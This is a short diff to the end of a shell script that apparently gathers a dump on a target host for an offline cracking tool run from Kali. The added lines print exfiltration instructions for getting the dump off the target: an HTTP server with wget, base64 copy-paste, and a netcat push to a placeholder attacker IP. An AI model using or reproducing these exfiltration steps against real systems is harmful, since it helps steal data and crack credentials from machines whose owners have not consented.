@@ -203,5 +203,18 @@ fi
 
 rm -rf "$STAGE" 2>/dev/null
 umask "$UMASK_OLD"
+BN=$(basename "$OUT")
 log "done -> $OUT"
-echo "[*] exfil it, then on kali:  python3 nixdump.py --offline '$OUT'"
+cat <<EOF
+
+[*] EXFIL (pick one), then on kali:  python3 nixdump.py --offline $BN --crack --json
+
+  A) http pull   target: python3 -m http.server 8001
+                 kali:   wget http://<TARGET_OR_240.0.0.1>:8001/$BN
+
+  B) base64      target: base64 -w0 $OUT ; echo
+                 kali:   echo '<PASTE>' | base64 -d > $BN
+
+  C) nc push     kali:   nc -lvnp 4445 > $BN
+                 target: nc <KALI_IP> 4445 < $OUT
+EOF
